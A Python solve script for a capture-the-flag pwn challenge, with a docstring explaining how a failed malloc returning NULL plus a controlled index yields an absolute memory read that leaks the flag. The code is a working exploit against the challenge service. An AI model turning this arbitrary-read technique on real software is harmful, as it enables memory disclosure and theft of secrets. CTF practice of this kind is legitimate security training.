#!/usr/bin/env python3
"""
what is my pointer 4 - AlpacaHack Daily (pwn, Hard)

main() leaks the address of getenv("FLAG") (the flag string), then does:

    item = malloc(size);          // size we control
    printf("0x%lx\n", item[index]) // index we control (signed 64-bit)

If `size` is huge, malloc() returns NULL, so item == NULL and
    item[index] == *(unsigned long *)(0 + index*8) == *(index*8)
is an ABSOLUTE 8-byte read at address 8*index.

The program reads exactly one index per run, so we read 8 bytes per
connection and reconnect until the whole flag string is recovered. ASLR
re-randomises the flag address each run, but it is re-leaked every time, and
we key recovered bytes by their offset relative to the flag start, so reads
from different connections line up.

Usage: python3 -I solve.py HOST PORT
"""
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
HUGE_SIZE = (1 << 62)  # malloc() of ~4 EiB fails -> NULL


def recv_until(sock, marker):
    buf = b""
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def read_block(aligned_addr_of):
    """One connection: leak flag addr, read 8 bytes at an aligned address.

    aligned_addr_of(flag_addr) -> absolute aligned address to read.
    Returns (flag_addr, address_read, 8_bytes_le).
    """
    s = socket.create_connection((HOST, PORT), timeout=15)
    try:
        head = recv_until(s, b"size> ")
        m = re.search(rb"flag:\s*0x([0-9a-fA-F]+)", head)
        if not m:
            raise RuntimeError(f"no leak in: {head!r}")
        flag_addr = int(m.group(1), 16)

        addr = aligned_addr_of(flag_addr)
        assert addr % 8 == 0
        index = addr // 8

        s.sendall(f"{HUGE_SIZE}\n".encode())
        recv_until(s, b"index> ")
        s.sendall(f"{index}\n".encode())

        tail = recv_until(s, b"bye")
        vm = re.search(rb"0x([0-9a-fA-F]+)", tail)
        if not vm:
            raise RuntimeError(f"no value in: {tail!r}")
        value = int(vm.group(1), 16)
        return flag_addr, addr, value.to_bytes(8, "little")
    finally:
        s.close()


def main():
    found = {}  # flag-relative offset -> byte
    m = 0
    end = None
    while m < 16:
        # read the aligned block at (flag_base + 8*m), flag_base = flag_addr - off
        flag_addr, addr, blk = read_block(lambda fa: (fa & ~7) + 8 * m)
        rel0 = addr - flag_addr  # flag-relative offset of this block's first byte
        for i, b in enumerate(blk):
            r = rel0 + i
            if r >= 0:
                found[r] = b
                if b == 0 and (end is None or r < end):
                    end = r
        # stop once we have a terminator and every byte up to it
        if end is not None and all(j in found for j in range(end)):
            break
        m += 1

    length = end if end is not None else max(found) + 1
    flag = bytes(found.get(j, 0x3f) for j in range(length))
    print(flag.decode("latin-1"))


if __name__ == "__main__":
    main()
